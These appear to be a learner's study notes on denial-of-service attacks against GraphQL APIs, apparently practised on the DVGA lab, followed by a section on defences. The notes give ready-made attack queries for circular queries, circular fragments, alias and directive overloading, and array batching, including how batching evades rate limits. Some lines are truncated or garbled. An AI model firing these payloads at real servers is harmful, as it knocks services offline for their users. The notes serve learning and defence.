# GraphQL DoS Vectors

- Sending very complex data structure and the server find it expensive to fulfill the query, this can lead to downtime or degrading the server’s performance.
- How the client could trigger DoS :
    - Single request and one complex query.
    - Single request and multiple complex queries.
    - Multiple requests and one complex query.
    - Multiple requests and multiple complex queries.

# Circular Queries (recursive queries)

- It occurs when two nodes in a GraphQL schema are bidirectionally referenced using an edge.
- This circular reference forces the server to return an exponentially large response each time the query completes a circle.

## Circular Relationships in GraphQL Schemas :

- *Circular relationship* or a *circular reference* occurs when 2 types are interconnected in such a way that allows a client to “jump” from one type to another if they are linked together.
- For example:
    - If we wanted to reveal the owner of a given paste, the schema will be :
        
        ```graphql
        type Paste {
        	title: String
        	content: String
        	user_agent: String
        	ip_address: String
        	owner: Owner
        }
        type Owner {
        	ip_address: String
        	user_agent: String
        	pastes: [Paste]  # Owner has a list of pastes
        	name: String
        }
        ```
        
        - `Paste` → references `Owner`
        - `Owner` → references `[Paste]`
    - A malicious client could force GraphQL server’s function resolver to loop by this circular query :
        
        ```graphql
        query {
          pastes {
            owner {
              pastes {
                owner {
                  pastes {
                    owner {
                      name
                    }
                  }
                }
              }
            }
          }
        }
        ```

- Example excerpt :
    
    ```graphql
    type PasteObject {
    # --snip--

    type OwnerObject {
    # --snip--

    # --snip--
    }
    ```

    2. It defines an array of objects of type `PasteObject`.

## Circular Introspection Vulnerabilities :

- The introspection schema itself may has circular relationships, for example :
    
    ```graphql
    type __Schema {
      types: [__Type!]!   # ➤ [1]
      ...
    }
    
    type __Type {
      fields(includeDeprecated: Boolean = false): [__Field!]   # ➤ [2]
      ...
    }
    
    type __Field {
      type: __Type!       # ➤ [3]
      ...
    }
    
    ```
    
    - How It Loops:
        1. `__Schema.types` returns **[`__Type`]** ⟶
        2. Each `__Type.fields` returns **[`__Field`]** ⟶
        3. Each `__Field.type` points back to **`__Type`** again
    - The cycle is : `__Schema → __Type → __Field → __Type → ...`

- It can be exploited by query like :
    
    ```graphql
    query {
      __schema {
        types {
          fields {
            type {
              fields {
                type {
                  fields {
                    name
                  }
                }
              }
            }
          }
        }
      }
    }
    ```

## Circular Fragment Vulnerabilities :

- **Fragments** are reusable pieces of query logic. Clients can define them to avoid repetition, especially when the same fields are fetched from multiple types, such as :
    
    ```graphql
    fragment PasteFields on PasteObject {
      title
      content
    }
    
    {
      pastes {
        ...PasteFields
      }
    }
    ```
    
- GraphQL Spec Rule:
    
    > "The graph of fragment spreads must not form any cycles including spreading itself."
    > 
- A **circular fragment** occurs when two or more fragments **include each other**, forming a **loop** (or even self-reference). This causes **infinite expansion** during query parsing and can **crash or DoS** vulnerable servers.
- Example of a Circular Fragment Query :
    
    ```graphql
    query CircularFragment {
      pastes {
        ...Start
      }
    }
    
    fragment Start on PasteObject {
      title
      content
      ...End    # Start includes End
    }
    
    fragment End on PasteObject {
      ...Start  # End includes Start (CYCLE!)
    }
    ```
    
- If the server is **not spec-compliant**, it **crashes** (e.g. **DVGA).**
- If the server follows the spec, it should detect the cycle and reject the query with a validation error

# Field Duplication

- It is simple to execute, yet **less effective than circular queries.**
- They are large queries that exhaust the server because of the amount of time they take to process and resolve.
- If this is the query :
    
    ```graphql
    query {
    pastes {
    		title
    		content
    	}
    }
    ```
    
- If we “stuff” additional fields in the query, GraphQL will be forced to resolve each field separately.
- Choose a field that you think might be expensive to resolve, and stuff the query with additional copies of that field’s name to make query :
    
    ```graphql
    query {
    	pastes {
    		title
    		content
    		content
    		content
    		content
    		content
    	}
    }
    ```
    
- GraphQL will consolidate the response and display only a single content JSON field :
    
    ```json
    {
    	"data": {
    		"pastes": [
    			{
    				"title": "My Title",
    				"content": "My First Paste"
    			}
    		]
    	}
    }
    ```
    
- **Some fields will require more resources to resolve,** so the performance impact might vary depending on the chosen field.
- Try query in:

# Alias Overloading

- Aliases allows you to add the same query many time in the same HTTP request.
- So, if we have a query with high latency like this :
    
    ```graphql
    query {
    	systemUpdate
    }
    ```
    
- We can perform DoS using this query :
    
    ```graphql
    query {
    	one:systemHealth
    	two:systemHealth
    	three:systemHealth
    	four:systemHealth
    	five:systemHealth
    }
    ```
    
- Use this command to generate dozens of queries (wsl) :                                                                 `python3 -c 'for i in range(0, 10): print("q"+str(i)+":"+"systemHealth")'`
- You can chain Aliases with circular queries when you make more than one circular query in a single GraphQL document like :
    
    ```graphql
    query {
      q1: pastes {
        owner {
          pastes {
            owner {
              name
            }
          }
        }
      }
      q2: pastes {
        owner {
          pastes {
            owner {
              name
            }
          }
        }
      }
    }
    ```
    
- **You cannot mix root types (queries, mutations).**

# Directive Overloading

- **Directives** are annotations prefixed with `@`, used to **alter query execution** behavior.
- **Directive Overloading** is an abuse where an attacker **adds a massive number of fake directives** to a single query field.
- These directives **don’t need to exist** or have any effect but **they still get parsed and validated by the server** which leads to DoS.

```graphql
query getPaste {
  pastes {
    title
    content
    owner @skip(if: true) {
      name
    }
  }
}
```

```graphql
query getPaste {
  pastes {
    title
    content
    owner @dos(if: true) {
      name
    }
  }
}
```

# Object Limit Overriding

- Fields that return **lists** can return **many items** without proper server-side limitations like :
    
    ```graphql
    type Query {
      pastes: [PasteObject]!
    }
    ```
    
    - This query may return thousands of pastes.
- Some applications do implement limits (like “only return 100 objects”) :
    
    ```graphql
    query {
      pastes(limit: 100, public: true) {
        content
      }
    }
    ```
    
    - It is translated to : `SELECT content FROM pastes WHERE public = true LIMIT 100;`
- You can exploit this by :
    - Try the common pagination arguments even if introspection is disabled (e.g. `limit`,`offset`,`after`,`first`,`last`,`max`,`total` ).
    - Use query like this :
        
        ```graphql
        query {
          users(limit: 50000) {
            username
            email
          }
        }
        ```

# Array-Based Query Batching

- GraphQL allows sending **multiple queries or mutations or both** in one request by **wrapping them in a JSON array**, like this:
    
    ```json
    [
      {"query": "query { systemHealth }"},
      {"query": "query { systemHealth }"}
    ]
    ```
    
    - Each item in the array is a **separate GraphQL operation**. The server processes each one **sequentially** and then sends back an **array of responses**.
- Most WAFs, reverse proxies, and API gateways count HTTP requests per second (RPS). With this method:
    - 1 HTTP request == 1,000 queries
    - Server might log **one request**, not **one thousand**
    - This may lead to DoS.
- Query batching is more effective in rate-limit evasion that alias (alias appears in logging system)
- Use this tool to detect this process : https://github.com/assetnote/batchql.
    
    ```bash
    python3 batch.py -e http://localhost:5013/graphiql
    ```

# Denial-of-Service Defenses in GraphQL

## Query Cost Analysis :

- GraphQL allows flexible and nested queries, which can be **abused** to craft very **expensive queries.**
- To protect against such abuses, some GraphQL servers implement **query cost analysis** they assign a numeric “cost” to each field or operation.
- If the total cost of a query exceeds a **MAX_COST** (e.g., 200), the query is **rejected**.
- For example, let’s say this is the schema :
    
    ```graphql
    type PasteObject {
      title: String @cost(complexity: 1)
      content: String @cost(complexity: 1)
      userAgent: String @cost(complexity: 5)
      ipAddr: String @cost(complexity: 5)
    }
    ```
    
    - And this is the query :
        
        ```graphql
        query {
          pastes {
            title        # cost: 1
            content      # cost: 1
            userAgent    # cost: 5
            ipAddr       # cost: 5
          }
        }
        ```
        
    - Would have a **total cost of 12**, which is acceptable.
- The GraphQL server is stateless and only checks **each query in isolation,** so if we have **MAX_COST=200,** we can send many queries (cost=200) in parallel which all will be accepted.

---

## Dynamically Assigning Cost to the Server Response :

- **Dynamic cost analysis** inspects the **actual response** from the server **after executing** the query.
- Let’s say we have this is query :
    
    ```graphql
    query {
      pastes {
        title
      }
    }
    ```
    
    - In static cost analysis:
        - You’d assign a small cost (e.g., `1` for `title`), and think it’s cheap.
    - In dynamic cost analysis:
        - If `pastes` returns **1,000 items**, the server Fetches a **huge dataset.** 
        So, **the real cost** is high.
- GraphQL allows servers to return **metadata** along with the data in a field called `extensions` to track the usage :
    
    ```graphql
    {
      "data": {
        "pastes": [
          { "title": "XSS PoC" },
          { "title": "SQLi test" }
        ]
      },
      "extensions": {
        "cost": {
          "credits_total": 1000,
          "credits_remaining": 990
        }
      }
    }
    ```
    

---

## Using Credits-Based Rate Limiting :

- Each client (IP, session, API key, etc.) gets a **credit allowance**.
- For example, we have 1000 credit per hour and a query with cost 200, so we can only 5 queries in hour otherwise the queries will be blocked.

---

## Query Depth Limits :

- To protect a GraphQL server from recursive queries, applications can set query depth limits.
- For example, setting a *max_depth* configuration to a value of 10 would allow up to only 10 levels of depth.
- If an attacker sends multiple recursive queries simultaneously, this can still impact the server.

---

## Alias and Array-Based Batching Limits :

- Preventing aliases from being abused requires custom middleware code that parses the incoming query, counts the number of specified aliases, and rejects the request if the number appears high enough that it could be dangerous to process.
- Unlike aliases, array-based batching is not part of the specification document. It often requires installing additional packages or enabling the feature in the code.

## Query Allow Lists :

- A **query allow list** defines a **strict set of safe, pre-approved queries** the application will accept. Any other query, even if syntactically valid, is **rejected**.
- Developers should implement it.

---

## Automatic Persisted Queries :

- **APQ (Automatic Persisted Queries)** lets a client send just a **short hash** of a GraphQL query instead of the full query string to **improve performance and reduce bandwidth**.
- How It Works
    1. **Client sends a SHA-256 hash** of the GraphQL query.
    2. **Server checks** if it already knows this hash.
        - ✅ **Found** → Query is run directly.
        - ❌ **Not found** → Server responds with error.
    3. **Client re-sends** full query + hash → Server **stores it in cache**.
    4. All **future requests** can use just the hash — faster & lighter.
- Attacker may cache malicious query so it should combined with allow list.

---

## Timeouts :

- When a **GraphQL server** receives **expensive or slow queries**, it can get overwhelmed, leading to Slow responses and resource exhaustion
- To prevent this, **timeouts** are enforced both in application code and at the web server level (60s)
